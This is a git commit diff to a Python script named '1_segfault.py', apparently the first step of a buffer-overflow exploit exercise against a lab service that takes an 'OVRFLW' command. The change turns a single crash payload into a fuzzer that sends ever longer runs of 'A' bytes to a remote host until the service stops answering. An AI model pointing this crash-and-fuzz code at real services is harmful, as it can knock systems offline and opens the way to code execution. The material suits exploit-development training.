3754e9f85de37ae904aeca4b55b3120234e7f76a
3isenHeiM <3isenHeiM@users.noreply.github.com>
2021-02-02 09:57:09 +0100

    Added incremental buffer total length detection

--- 1_segfault.py
+++ 1_segfault.py
@@ -1,13 +1,30 @@
 #!/usr/bin/env python3
-import socket
+import socket,sys,time
 
-from PARAMETERS import RHOST, RPORT, buf_totlen
+from PARAMETERS import RHOST, RPORT
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((RHOST, RPORT))
+# Incremental buffer size detection
+timeout = 5
 
-buf = b""
-buf += b"A"*buf_totlen
-buf += b"\n"
+buffer_list = []
+counter = 200
 
-s.send(b"OVRFLW " + buf + b"\n")
+# This will create a list of buffers up to 5000 chars (200, 400, 600, ...).
+while len(buffer_list) < 50:
+    buffer_list.append(b"A" * counter)
+    counter += 200
+
+for buf in buffer_list:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((RHOST, RPORT))
+        s.recv(1024)
+        print("Fuzzing with %s bytes" % len(buf))
+        s.send(b"OVRFLW " + buf + b"\n")
+        s.recv(1024)
+        s.close()
+    except:
+        print("Could not connect to " + RHOST + ":" + str(RPORT))
+        sys.exit(0)
+    time.sleep(2)
